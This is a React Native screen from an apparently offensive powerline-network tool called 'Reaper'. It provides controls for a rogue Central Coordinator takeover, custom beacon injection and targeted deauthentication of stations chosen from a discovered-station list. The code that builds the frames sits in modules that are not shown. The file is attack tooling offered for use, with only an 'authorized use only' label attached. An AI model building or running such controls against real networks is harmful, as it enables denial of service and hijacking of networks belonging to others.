// screens/InjectScreen.js — active injection: rogue CCo + deauth
// Author: jayis1
// License: MIT

import React, { useState } from 'react';
import { View, Text, StyleSheet, TouchableOpacity, TextInput, Alert } from 'react-native';
import { useReaper } from '../utils/protocol';
import StatusBar from '../components/StatusBar';
import { MSG } from '../utils/protocol';

export default function InjectScreen() {
  const { send, stations } = useReaper();
  const [tei, setTei] = useState('');

  const rogueCco = () => {
    Alert.alert('Rogue CCo', 'Take over Central Coordinator election?', [
      { text: 'Cancel' },
      { text: 'Inject', style: 'destructive', onPress: () => send(MSG.ROGUE_CCO) },
    ]);
  };

  const doDeauth = () => {
    const t = parseInt(tei, 16);
    if (isNaN(t)) { Alert.alert('Bad TEI'); return; }
    const p = new Uint8Array([t & 0xFF]);
    send(MSG.INJECT_DEAUTH, p);
  };

  const injectBeacon = () => {
    Alert.alert('Inject Beacon', 'Send a custom beacon frame?', [
      { text: 'Cancel' },
      { text: 'Inject', style: 'destructive', onPress: () => send(MSG.INJECT_BEACON) },
    ]);
  };

  return (
    <View style={styles.container}>
      <StatusBar />
      <View style={styles.header}>
        <Text style={styles.h1}>Inject</Text>
        <Text style={styles.warning}>⚠ Active injection — authorized use only</Text>
      </View>

      <TouchableOpacity style={styles.btnDanger} onPress={rogueCco}>
        <Text style={styles.btnText}>Rogue CCo Takeover</Text>
      </TouchableOpacity>
      <Text style={styles.help}>Take over Central Coordinator election by injecting beacons with higher priority.</Text>

      <TouchableOpacity style={styles.btnWarn} onPress={injectBeacon}>
        <Text style={styles.btnText}>Inject Custom Beacon</Text>
      </TouchableOpacity>

      <View style={styles.deauthBox}>
        <Text style={styles.h2}>Selective Deauth</Text>
        <Text style={styles.label}>Target TEI (hex)</Text>
        <TextInput style={styles.input} value={tei} onChangeText={setTei}
          placeholder="0x12" placeholderTextColor="#444" />
        <TouchableOpacity style={styles.btnDanger} onPress={doDeauth}>
          <Text style={styles.btnText}>Deauth</Text>
        </TouchableOpacity>
      </View>

      <View style={styles.stationBox}>
        <Text style={styles.h2}>Discovered Stations (tap to deauth)</Text>
        {stations.map((s, i) => (
          <TouchableOpacity key={i} onPress={() => setTei('0x' + s.tei.toString(16).padStart(2,'0'))}>
            <Text style={styles.stationItem}>{s.role} {s.mac} TEI=0x{s.tei.toString(16)} SNR={s.snr}dB</Text>
          </TouchableOpacity>
        ))}
      </View>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#0a0a0a', padding: 12 },
  header: { marginVertical: 12 },
  h1: { color: '#eee', fontSize: 20, fontWeight: 'bold' },
  warning: { color: '#ffaa00', fontSize: 11, marginTop: 4 },
  btnDanger: { backgroundColor: '#3a1a1a', padding: 14, borderRadius: 6, marginTop: 8, alignItems: 'center' },
  btnWarn: { backgroundColor: '#3a2a1a', padding: 14, borderRadius: 6, marginTop: 8, alignItems: 'center' },
  btnText: { color: '#ff5555', fontSize: 14, fontWeight: 'bold' },
  help: { color: '#666', fontSize: 11, marginTop: 4 },
  deauthBox: { backgroundColor: '#111', padding: 10, borderRadius: 6, marginTop: 12 },
  h2: { color: '#00ffaa', fontSize: 13, fontFamily: 'monospace', marginBottom: 8 },
  label: { color: '#888', fontSize: 11, marginTop: 6 },
  input: { backgroundColor: '#0a0a0a', color: '#eee', borderWidth: 1, borderColor: '#222', borderRadius: 4, padding: 8, marginTop: 4, fontFamily: 'monospace' },
  stationBox: { backgroundColor: '#111', padding: 10, borderRadius: 6, marginTop: 12, flex: 1 },
  stationItem: { color: '#ccc', fontSize: 11, fontFamily: 'monospace', padding: 6, borderBottomWidth: 0.5, borderBottomColor: '#222' },
});